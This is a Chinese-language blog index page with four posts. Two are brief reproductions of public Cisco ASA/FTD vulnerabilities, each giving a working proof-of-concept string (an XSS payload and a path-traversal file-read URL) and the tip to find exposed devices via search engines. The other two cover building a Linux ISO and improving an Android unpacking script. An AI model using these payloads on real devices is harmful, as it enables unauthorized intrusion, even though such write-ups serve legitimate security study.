                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>前段时间碰到了该漏洞，记录一下！</strong>  </p>
<hr>
<h1 id="二、漏洞介绍"><a href="#二、漏洞介绍" class="headerlink" title="二、漏洞介绍"></a>二、漏洞介绍</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>该漏洞为思科ASA设备和FTD设备的未授权反射型XSS漏洞，影响版本如下：</strong>  </p>
<ul>
<li><p>Cisco ASA Software 9.6</p>
</li>
<li><p>Cisco ASA Software 9.7</p>
</li>
<li><p>Cisco ASA Software 9.8</p>
</li>
<li><p>Cisco ASA Software 9.9</p>
</li>
<li><p>Cisco ASA Software 9.10</p>
</li>
<li><p>Cisco ASA Software 9.12</p>
</li>
<li><p>Cisco ASA Software 9.13</p>
</li>
<li><p>Cisco ASA Software 9.14</p>
</li>
<li><p>Cisco ASA Software 9.15</p>
</li>
<li><p>Cisco FTD Software 6.2.2</p>
</li>
<li><p>Cisco FTD Software 6.2.3</p>
</li>
<li><p>Cisco FTD Software 6.3.0</p>
</li>
<li><p>Cisco FTD Software 6.4.0</p>
</li>
<li><p>Cisco FTD Software 6.5.0</p>
</li>
<li><p>Cisco FTD Software 6.6.0</p>
</li>
<li><p>Cisco FTD Software 6.7.0</p>
</li>
</ul>
<hr>
<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>首先利用<code>zoomeye</code>或者<code>fofa</code>等搜索设备，搜索关键词为<code>/+CSCOE+/</code>，该漏洞出现在<code>/+CSCOE+/saml/sp/acs</code>接口处，<code>POC</code>为<code>SAMLResponse=&quot;&gt;&lt;svg/onload=alert(&#39;XSS&#39;)&gt;</code>，访问设备后修改包为<code>POC</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//CVE-2020-3580/1.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>然后<code>forward</code>即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//CVE-2020-3580/2.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2021/11/21/40/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/21/40/" class="post-title-link" itemprop="url">CVE-2020-3452漏洞复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-11-21 23:06:40" itemprop="dateCreated datePublished" datetime="2021-11-21T23:06:40+08:00">2021-11-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:07:38" itemprop="dateModified" datetime="2024-11-12T23:07:38+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>457</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>前端时间碰到了该漏洞，记录一下！</strong></p>
<hr>
<h1 id="二、漏洞介绍"><a href="#二、漏洞介绍" class="headerlink" title="二、漏洞介绍"></a>二、漏洞介绍</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>该漏洞为思科ASA设备和FTD设备的未授权任意文件读取漏洞，但仅能读取到<code>WEB</code>目录下的文件，影响版本如下：</strong>  </p>
<ul>
<li><p>Cisco ASA：&lt;&#x3D; 9.6  </p>
</li>
<li><p>Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14  </p>
</li>
<li><p>Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0</p>
</li>
</ul>
<hr>
<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>首先利用<code>zoomeye</code>或者<code>fofa</code>搜索设备，搜索关键词为<code>/+CSCOE+/</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//CVE-2020-3452/1.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong><code>POC</code>为<code>URL/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//CVE-2020-3452/2.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2021/11/14/00/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/14/00/" class="post-title-link" itemprop="url">从零开始制作一个linux iso镜像</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-11-14 22:48:00" itemprop="dateCreated datePublished" datetime="2021-11-14T22:48:00+08:00">2021-11-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:06:05" itemprop="dateModified" datetime="2024-11-12T23:06:05+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>对于一个极简化的linux系统而言，只需要三个部分就能组成，它们分别是一个linux内核、一个根文件系统和引导。以下是本文制作linux iso镜像所用到的系统和软件：</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>OS: ubuntu 20</strong><br>&ensp;&ensp;&ensp;&ensp;<strong>软件: xorriso</strong></p>
<hr>
<h1 id="二、制作linux内核"><a href="#二、制作linux内核" class="headerlink" title="二、制作linux内核"></a>二、制作linux内核</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、首先需要去官网选择一个需要的版本下载下来，官网下载地址：<a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、利用tar将其解压，然后进入其目录中，然后配置内核，常见的配置有以下几种：</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>a、make defconfig - 默认配置</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>b、make allyesconfig - 创建能选yes就选yes的配置</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>c、make allnoconfig - 创建能选no就选no的配置</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>d、make menuconfig - 基于ncurser的图形化界面配置</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>这里采用命令make defconfig使用默认的即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/1.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、然后使用<code>make bzImage</code>命令编译出内核即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/2.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>编译好的内核文件在<code>arch</code>文件夹相应的架构文件夹下面，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/3.png"></p>
<hr>
<h1 id="三、制作根文件系统"><a href="#三、制作根文件系统" class="headerlink" title="三、制作根文件系统"></a>三、制作根文件系统</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、我们这里利用busybox来制作一个根文件系统，busybox可以简单理解为一个linux工具的集合。首先还是下载busybox，官网下载地址：<a target="_blank" rel="noopener" href="https://busybox.net/downloads/">https://busybox.net/downloads/</a></strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、编译busybox与编译内核步骤基本一致，将下载好的压缩包进行解压，然后进入文件夹中，使用make defconfig配置默认编译选项，这里需要注意的是，在生成的<code>.config</code>配置文件中，需要设置<code>CONFIG_STATIC=y</code>，如果没有，添加即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/4.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/7.png"> </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、然后使用<code>make busybox install</code>命令编译busybox，编译好后会在当前目录下面生产一个<code>_install</code>文件夹，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/5.png"><br><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/6.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、然后创建一个<code>rootfs</code>文件夹，并将<code>_install</code>文件夹下面除<code>linuxxrc</code>以外的所有文件及文件夹都拷贝到<code>rootfs</code>文件夹下面，最后创建<code>dev</code>等文件夹，最后在根目录下面创建<code>init</code>文件即可，文件内容如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/8.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/9.png"></p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>5、最后利用命令<code>find . | cpio -R root:root -H newc -o | gzip &gt; ../rootfs.gz</code>将文件系统打包，至此，一个文件系统就创建完成了，如下图所示：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/10.png"> </p>
<hr>
<h1 id="四、BIOS"><a href="#四、BIOS" class="headerlink" title="四、BIOS"></a>四、BIOS</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、这里我们使用<code>syslinux</code>来创建<code>bios</code>引导的一个linux iso镜像，<code>syslinux</code>官方下载地址如下：<a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/utils/boot/syslinux/">https://mirrors.edge.kernel.org/pub/linux/utils/boot/syslinux/</a></strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、将下载好的<code>syslinux</code>解压，然后创建文件夹<code>isobios</code>，将解压后的<code>syslinux</code>文件夹下面的<code>bios/core/isolinux.bin</code>、<code>bios/com32/elflink/ldlinux/ldlinux.c32</code>复制到<code>isobios</code>文件夹下面，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/11.png"></p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、在<code>isobios</code>文件夹下面创建配置文件<code>isolinux.cfg</code>，文件内容如下所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/12.png"></p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、最后，在<code>isobios</code>文件夹下面使用命令<code>xorriso -as mkisofs -o ../testbios.iso -b isolinux.bin -c boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table ./</code>生成iso镜像文件，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/13.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>5、使用虚拟机<code>vmware</code>创建一个虚拟机，如下图所示，便是我们创建的一个linux iso镜像跑起来的样子。</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/14.png"></p>
<hr>
<h1 id="五、UEFI"><a href="#五、UEFI" class="headerlink" title="五、UEFI"></a>五、UEFI</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、uefi这里采用<code>system-boot</code>和<code>syslinux</code>配合来制作，首先，创建两个文件夹<code>isouefi</code>和<code>tmp</code>，其中，<code>isouefi</code>用来挂载设备，<code>tmp</code>文件夹用来临时存放文件以计算大小，然后在<code>tmp</code>文件夹下面创建<code>EFI/BOOT</code>和<code>loader/entries</code>目录，接着，将解压后的<code>systemboot</code>下面的<code>uefi_boot/EFI/BOOT/BOOTx64.EFI</code>文件拷贝到<code>tmp/EFI/BOOT</code>目录下面，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/15.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、接着，在<code>tmp/loader</code>目录下面，创建文件<code>loader.conf</code>配置文件，第一行表示默认配置是<code>entries</code>目录下那个文件，第二行设置默认超时时间；然后在<code>entries</code>文件夹下面创建相应的配置文件，这里是<code>mll-x86_64.conf</code>，文件内容和<code>bios</code>的差不多，不在单独细说，最后再将前面准备好的内核和文件系统拷贝到<code>tmp</code>目录下面，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/16.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/17.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/18.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、此时就可以根据<code>tmp</code>文件夹的总大小创建一个相同大小的<code>img</code>文件了，这里的<code>tmp</code>是<code>11M</code>，为了稳妥起见，这里创建一个<code>12M</code>的<code>img</code>文件，命令为<code>truncate -s 12M uefi.img</code>，然后使用<code>losetup -f</code>命令寻找一个当前未使用的逻辑设备，然后使用<code>losetup</code>命令将我们前面创建的<code>img</code>文件虚拟成改逻辑设备，接着利用<code>mkfs.vfat</code>将该设备格式化成<code>vfat</code>系统，接着使用<code>mount</code>命令将其挂载到<code>isouefi</code>文件夹下面，最后将<code>tmp</code>文件夹下面所有文件及其文件夹拷贝到<code>isouefi</code>目录下面，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/19.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/20.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、接着利用<code>umount</code>命令取消挂载，这样我们就得到一个包含<code>内核</code>、<code>文件系统</code>等的<code>img</code>文件，接着创建一个<code>iso</code>文件夹，并且在该文件夹下面将创建一个<code>boot</code>文件夹，然后将<code>img</code>复制到<code>iso/boot</code>下面，最后利用<code>xorriso</code>工具生成<code>iso</code>文件即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/21.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>5、最后，新建一个虚拟机，引导选择uefi，启动即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/22.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//make_linux_iso/23.png"></p>
<hr>
<h1 id="六、相关链接"><a href="#六、相关链接" class="headerlink" title="六、相关链接"></a>六、相关链接</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>github链接：<a target="_blank" rel="noopener" href="https://github.com/windy-purple/make_linux_iso">https://github.com/windy-purple/make_linux_iso</a></strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2021/05/03/16/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/03/16/" class="post-title-link" itemprop="url">对脱壳脚本的一些改进--识别出目标DEX</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-03 15:40:16" itemprop="dateCreated datePublished" datetime="2021-05-03T15:40:16+08:00">2021-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:04:30" itemprop="dateModified" datetime="2024-11-12T23:04:30+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p><strong>&ensp;&ensp;&ensp;&ensp;通常对于加壳的程序，第一步的操作通常是脱壳，而现在脱壳一般都选择利用<code>frida</code>来进行<code>hook</code>进行脱壳，不谈其他脱壳方式，利用<code>frida</code>脱壳原理大致分为两种：</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;1、找到DexFile对象(art虚拟机下是DexFile对象，dalvik虚拟机下是DexFile结构体)，获取到DEX文件的起始地址和大小，然后<code>dump</code>下来。常见能够找到<code>DexFile对象</code>的函数有<code>LoadMethod</code>、<code>ResolveMethod</code>函数等，能直接获取到<code>DEX起始地址和大小</code>的常见函数有<code>openMemory</code>、<code>dexparse</code>、<code>dexFileParse</code>、<code>dvmDexFileOpenPartial</code>等函数。<code>frida_unpack</code>便是其中的代表作。</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;2、利用frida的搜索内存，通过匹配<code>DEX</code>文件的特征，例如<code>DEX</code>文件的<code>文件头</code>中的<code>magic</code>—<code>dex.035</code>这个特征。<code>frida-Dexdump</code>便是这种脱壳方法的代表作。</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;然而不管是上述哪一种原理，在我这个有点<code>强迫症</code>的看来，都有一点小缺陷，这两种方法从原理上决定了经过某个函数的<code>DEX</code>(或者存在于内存中的<code>DEX</code>)都会被<code>dump</code>下来，所以出现了<code>dump</code>下来很多个<code>DEX文件</code>，但是只有其中一个或者几个是我们的<code>目标DEX</code>，为了寻找到<code>目标DEX</code>，只有全部反编译出后来能知道，这就比较浪费时间和精力了，对此，本人对脱壳脚本做了一些改进，通过对<code>dump</code>下来的<code>DEX</code>进行解析，从而识别出那个是我们的<code>目标DEX</code>!!!</strong></p>
<hr>
<h2 id="二、通过类名识别出DEX"><a href="#二、通过类名识别出DEX" class="headerlink" title="二、通过类名识别出DEX"></a>二、通过类名识别出DEX</h2><p><strong>&ensp;&ensp;&ensp;&ensp;PS:通过类名识别是本人发现识别率最准确、实现代价最小的方法，所以本篇重点主要在这，后面的其他识别方法在某些特殊情况下更好用！！！</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;<code>DEX</code>文件的格式可以大致分为<code>文件头</code>、<code>索引区</code>、<code>数据区</code>，<code>文件头</code>这个区域无法找到一个<code>DEX</code>文件的一个<code>唯一特征</code>(ps:<code>sha-1</code>和<code>校验码</code>这两个能作为一个<code>DEX文件</code>唯一特征的前提是我们已经知道这个<code>dex</code>文件所有字节了，所以放在这里并不成立)，<code>索引区</code>包括了很多数据的索引，其中便包括<code>字符串</code>的索引，通过这我们可以解析出整个<code>DEX</code>文件使用到的字符串。而我们已知的<code>DEX</code>文件的一些信息便包括<code>包名</code>。</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;通过解析一个<code>DEX</code>文件，我们可以发现在<code>DEX</code>中一个类被表示出如下形式–<code>L包名/类名;</code>，例如<code>Lcom/example/test/ManActivity;</code>这种形式，例如下面为使用脚本解析<code>DEX</code>的字符串，获取到的类名的截图：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//dumpshell/1.png">  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;包名是唯一的，所以我们只需要构造<code>/com/example/test</code>这种形式的特征，便可以很轻易的锁定到<code>目标DEX</code>，但是，在<code>壳程序</code>中，也可能含有这种类型的字符串，我们的特征便不再是唯一的，这个时候，我们便需要一个新的唯一特征。</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;在一个APP中，我们通常所写的类不止一个，而是很多个，那么便含有很多个上述所说的<code>特征</code>；而写过加壳程序都应该知道，我们在加壳程序中，最多也就拉起那么一个或几个类。那么，通过这种数量上的差异同样也可以作为唯一特征，以下是<code>脱壳改进脚本脚本</code>运行截图：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//dumpshell/2.png">  </p>
<hr>
<h2 id="三、其他识别方法"><a href="#三、其他识别方法" class="headerlink" title="三、其他识别方法"></a>三、其他识别方法</h2><p><strong>&ensp;&ensp;&ensp;&ensp;1、其他字符串，通过将app安装运行手动观察到的，但是这种方式有点碰运气，只有直接写入到<code>java</code>源码中的才能作为特征，写入到<code>strings.xml</code>便不得行。如下截图(ps:为直接写入到java中的，可以在字符串池中解析出来的)，解析字符串池：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//dumpshell/3.png"></p>
<p><strong>&ensp;&ensp;&ensp;&ensp;2、布局xml文件名、控件名(ps:这种可行性太低，在这里筹字数的，基本不能作为特征)</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;3、布局、控件资源ID,这些16进制搜索整个DEX文件也可以作为特征，但是有很其他DEX文件装车的可能。</strong>  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;4、方法原型，例如一个方法返回值是Double，参数也是Double，那个这个方法原型便是<code>FF</code>，而这个方法原型一定存在于字符串池中，但是也不是很靠谱这个特征，原因如下截图所示(而且还需要知道一个方法才行)：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//dumpshell/4.png">  </p>
<p><strong>&ensp;&ensp;&ensp;&ensp;5、对DEX做更深入解析，解析出更多特征，而不仅仅止于解析出字符串池，感兴趣的研究一下，但第一个依靠类名便够用了。</strong>  </p>
<hr>
<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>&ensp;&ensp;&ensp;&ensp;github地址：<a target="_blank" rel="noopener" href="https://github.com/windy-purple/dumpshell">https://github.com/windy-purple/dumpshell</a></strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">windy_ll</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">windy_ll</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">144k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:23</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
